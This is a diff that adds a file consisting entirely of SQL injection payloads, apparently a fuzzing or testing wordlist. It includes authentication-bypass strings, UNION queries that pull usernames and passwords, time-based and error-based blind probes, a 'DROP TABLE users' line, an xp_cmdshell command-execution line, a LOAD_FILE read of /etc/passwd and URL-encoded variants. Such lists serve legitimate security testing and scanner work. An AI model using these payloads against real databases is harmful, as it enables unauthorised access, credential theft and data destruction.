@@ -1,0 +1,66 @@
+'
+''
+`
+``
+')
+'))
+')--
+'--
+'#
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1'#
+' OR '1'='1'/*
+" OR "1"="1
+" OR "1"="1"--
+" OR "1"="1"#
+1' OR 1=1--
+1" OR 1=1--
+1 OR 1=1
+' OR 1=1--
+' OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,2,3,4--
+' UNION SELECT username,password FROM users--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT NULL,NULL--
+1' AND SLEEP(5)--
+1' AND SLEEP(5)#
+1'; WAITFOR DELAY '0:0:5'--
+1'; SELECT SLEEP(5)--
+1 AND SLEEP(5)
+1; WAITFOR DELAY '0:0:5'
+' AND SLEEP(5) AND '1'='1
+' AND 1=1--
+' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 10--
+' GROUP BY 1--
+' HAVING 1=1--
+' AND (SELECT * FROM users)--
+' AND (SELECT COUNT(*) FROM users)>0--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+'; EXEC xp_cmdshell('ping 127.0.0.1')--
+'; DROP TABLE users--
+1; SELECT LOAD_FILE('/etc/passwd')--
+1' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--
+' AND 1=(SELECT 1 FROM pg_sleep(5))
+' AND pg_sleep(5)--
+' OR pg_sleep(5)--
+1%27%20OR%20%271%27%3D%271
+%27%20OR%20%271%27%3D%271%27--%20
+0x27 OR 0x313d31
+' RLIKE SLEEP(5)
+\
